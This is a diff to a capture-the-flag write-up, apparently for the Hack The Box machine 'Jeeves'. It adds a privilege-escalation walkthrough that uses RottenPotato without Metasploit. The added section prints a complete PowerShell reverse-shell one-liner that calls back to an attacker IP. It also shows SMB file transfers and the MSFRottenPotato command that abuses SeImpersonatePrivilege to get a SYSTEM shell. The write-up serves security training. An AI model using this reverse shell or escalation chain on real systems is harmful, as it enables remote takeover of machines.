@@ -128,12 +128,107 @@ Then, we can move directly to the "users" folder with no problem, list the avail
 
 To get the root flag there are two ways to get it where one compromises a file that has been gotten from the Documents directory within the user and the other way is using [RottenPotato](https://github.com/foxglovesec/RottenPotato) to scalate to root. 
 
+### Getting root flag - Method #1
+
+In the OSCP exam the chances to use The Metasploit Framework have its limits. To root in this way we are going to use [RottenPotato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/), but without metasploit. 
+
+So, we can start navigating through different folders with user privileges where in this case I chose ```C:\Users\kohsuke\Documents```. Once here we can upload a file with a powershell reverse shell that we can transfer from our Kali machine to Jeeves. This file is going to be named __shell.bat__ and it's going to content the following code:
+
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.36',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+So once this file is created in our Kali machine, it's time to transfer it to Jeeves using [smbserver from impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py).
+In the Kali Machine we execute:
+```
+smbserver SAM ~/htb/coffee/jeeves/10.10.10.63
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/smbsam.png" alt="smbsam">
+
+In Jeeves:
+
+```
+copy \\10.10.14.36\SAM\shell.bat
+```
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/copysmb.png" alt="copysmb">
+
+Once, our reverse shell has been uploaded to Jeeves, it's time to upload [MSFRottenPotato.exe](https://github.com/decoder-it/lonelypotato/blob/master/RottenPotatoEXE/MSFRottenPotato.exe) by the same way how we did it with the shell, using the smb server.
+
+In Jeeves:
+
+```
+copy \\10.10.14.36\SAM\MSFRottenPotato.exe
+```
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/rottensmb.png" alt="rottensmb">
+
+Once we have our revershell and MSFRottenPotato.exe files in Jeeves, we can start checking what privileges we have in order to set a parameter before executing MSFRottenPotato.exe. To know the privileges from our machine, we can execute the command:
+
+```
+whoami /priv
+```
+Then we see a privilege name that sounds quiet interesting which is SetImpersonatePrivilege and it's enabled!
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/privileges.png" alt="privileges">
+
+Saying that we can use the parameter ```t``` with MSFRottenPotato.exe to exploit this privilege, but once we have our shell, MSFRottenPotato.exe, and the privilege name is time to execute the following command which will execute MSFRottenPotato.exe and our rever shell. 
+
+```
+MSFRottenPotato.exe t c:\Users\kohsuke\Documents\shell.bat
+```
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/runrotten.png" alt="runrotten">
+
+so we have an authority system shell!
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/rottenshell.png" alt="rottenshell">
+
+After running the command, we got authority system! Now it's time to get the flag.
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/look-deeper.png" alt="look-deeper">
+
+It was suppose to be a flag in there, but we need to look deeper, so it's time to figure out how to read the flag. So, after reading another posts and googling around, there is a way to read the flag through [Alternative Data Streams](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/) . To list this kind of files we can run the command ```dir /r``` which will list most of the files, in this case our root.flag
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/before-root.png" alt="before-root">
+
+We can't view the flag with a simple ```type``` command, so we must use the command ```more``` in order to see the root flag.
+
+```more < hm.txt.root.txt```
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/root.png" alt="root">
+
+and we got root flag!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ### Getting root flag - Method #2
-
-In the OSCP exam the chances to use The Metasploit Framework have its limits. To root in this way we are going to use
-
-### Getting root flag - Method #1
 After looking around in the directories from the user __kohsuke__, there is a file in the Documents directory with __kdbx__ extension. 
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/list-documents.png" alt="list-documents">
